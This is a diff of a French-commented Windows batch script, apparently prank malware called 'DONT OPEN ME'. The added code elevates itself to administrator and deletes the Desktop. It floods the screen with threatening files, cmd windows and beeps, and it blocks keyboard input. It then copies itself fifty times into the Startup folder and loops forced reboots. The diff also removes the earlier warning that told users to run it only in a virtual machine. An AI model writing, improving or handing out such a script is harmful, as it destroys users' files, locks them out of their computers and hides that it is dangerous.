@@ -2,46 +2,63 @@
 :: Vérification des droits d'administrateur
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-    echo Ce script nécessite les droits d'administrateur.
-    echo Demande des droits d'administrateur...
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
-:: Création du fichier texte avec le message
-echo CE LOGICIEL A DESACTIVE TOUT CE QUE TON PC POUVAIT AVOIR > "%userprofile%\Desktop\Avertissement.txt"
-echo NewLifeIsHereDF sur github >> "%userprofile%\Desktop\Avertissement.txt"
-echo TU AS ÉTÉ PRÉVENU, SI CELA N'A PAS ÉTÉ LANCÉ SUR UNE VM, RESET TON PC ! >> "%userprofile%\Desktop\Avertissement.txt"
+:: Masquer la fenêtre pour rendre le script plus menaçant
+powershell -WindowStyle Hidden -Command ""
 
-:: Ouvre le fichier dans le Bloc-notes
-start notepad "%userprofile%\Desktop\Avertissement.txt"
+:: Mettre le volume au maximum
+powershell -Command "(New-Object -ComObject SAPI.SPVoice).Speak('Attention')"
 
-:: Boucle pour jouer un son Windows
-(for /l %%i in () do (echo ^G)) | cmd
-
-:: Désactivation temporaire du clavier
-rundll32 user32.dll,BlockInput 1
-timeout /t 10 >nul
-rundll32 user32.dll,BlockInput 0
-
-:: Suppression de tout sur le bureau
+:: Suppression de tous les fichiers sur le bureau
 set desktop=%userprofile%\Desktop
 del /f /q "%desktop%\*" >nul 2>&1
 rmdir /s /q "%desktop%" >nul 2>&1
 
-:: Suppression de tous les fichiers et dossiers utilisateur
-set userfolder=%userprofile%
-for /d %%i in ("%userfolder%\*") do (
-    rmdir /s /q "%%i" >nul 2>&1
-)
-for %%i in ("%userfolder%\*") do (
-    del /f /q "%%i" >nul 2>&1
-)
-
-:: Ouvrir une centaine de fenêtres cmd affichant "DONT OPEN ME"
+:: Remplir le bureau avec des fichiers menaçants
 for /l %%i in (1,1,100) do (
-    start cmd /k "echo DONT OPEN ME & pause"
+    echo YOU SHOULD NOT HAVE OPENED THIS... > "%desktop%\DONT_OPEN_ME_IS_HERE_%%i.txt"
 )
 
-:: Message final
-shutdown /s /f /t 0
+:: Lancer des fenêtres CMD en boucle avec des messages troublants
+for /l %%i in (1,1,100) do (
+    start cmd /k "color 4 & echo ******************************************* & echo ** YOU CAN'T ESCAPE DONT OPEN ME IS HERE ** & echo ******************************************* & pause"
+)
+
+:: Sons stridents et alarmes en boucle
+:start_sounds
+(for /l %%i in () do (
+    powershell -Command "[console]::beep(500,500)"
+    powershell -Command "[console]::beep(1000,500)"
+    powershell -Command "[console]::beep(1500,500)"
+)) | cmd
+
+:: Changer l'arrière-plan du bureau pour ajouter à la peur
+set warning_file=%userprofile%\Desktop\WARNING.txt
+echo !!! VOUS ÊTES CONTRÔLÉ PAR DONT OPEN ME !!! > "%warning_file%"
+echo VOTRE SYSTÈME EST MAINTENANT INUTILE. >> "%warning_file%"
+echo C'ÉTAIT INÉVITABLE. >> "%warning_file%"
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%warning_file%" /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+:: Désactivation temporaire du clavier
+rundll32 user32.dll,BlockInput 1
+timeout /t 15 >nul
+rundll32 user32.dll,BlockInput 0
+
+:: Ajouter le script au démarrage 50 fois
+set startup_folder=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+for /l %%i in (1,1,50) do (
+    setlocal enabledelayedexpansion
+    set random_name=!random!!random!
+    copy "%~f0" "%startup_folder%\DONT_OPEN_ME_!random_name!.bat"
+    endlocal
+)
+
+:: Redémarrage constant avec un message final terrifiant
+:loop
+msg * "DONT OPEN ME IS EVERYWHERE. YOU CAN'T ESCAPE."
+shutdown /r /f /t 15
+goto loop
